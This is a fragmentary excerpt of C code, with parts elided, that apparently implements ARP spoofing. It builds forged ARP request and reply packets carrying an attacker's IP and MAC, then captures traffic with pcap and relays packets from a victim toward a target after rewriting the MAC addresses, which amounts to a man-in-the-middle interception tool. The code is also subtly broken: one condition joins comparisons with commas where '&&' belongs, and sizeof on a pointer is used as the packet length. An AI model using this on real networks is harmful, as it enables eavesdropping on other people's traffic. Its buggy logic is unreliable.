...
int getmyip(uint8_t * addr){
    ...
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
        ...
        bcopy( ifr.ifr_addr.sa_data + 2 , addr, 4);
    }
...
//ARP header
    ...
    for (int i = 28; i < 32; i++) rq_packet[i] = att_ip[i - 28];
    for (int i = 32; i < 38; i++) rq_packet[i] = 0x00;
    for (int i = 38; i < 42; i++) rq_packet[i] = sender_ip[i - 38];
...
//sender's mac address
	...
	for (int i = 28; i < 32; i++) rp_packet[i] = target_ip[i - 28];
	for (int i = 32; i < 38; i++) rp_packet[i] = sen_mac[i - 32];
	for (int i = 38; i < 42; i++) rp_packet[i] = sender_ip[i - 38];
	...
	while (true) {
	    struct pcap_pkthdr* header;
	    const u_char* packet;
	    uint8_t relay_packet[6000];
	    int res = pcap_next_ex(handle, &header, &packet);
	    if (res == 0) continue;
	    if (res == -1 || res == -2) break;
	    if (packet[12] == 0x08 && packet[13] == 0x00) {
	        if (packet[6] == sen_mac[0] && packet[7] == sen_mac[1] && packet[8] == sen_mac[2] && packet[9] == sen_mac[3] && packet[10] == sen_mac[4] && packet[11] == sen_mac[5]) {
		    if(packet[26] == target_ip[0], packet[27] == target_ip[1], packet[28] == target_ip[2], packet[29] == target_ip[3]){
			memcpy(relay_packet, packet, sizeof(packet));
			relay_packet[6] = att_mac[0];
			relay_packet[7] = att_mac[1];
			relay_packet[8] = att_mac[2];
			relay_packet[9] = att_mac[3];
			relay_packet[10] = att_mac[4];
			relay_packet[11] = att_mac[5];
			pcap_sendpacket(handle, relay_packet, sizeof(packet));
		    }
		}
	    }
	    end = clock();
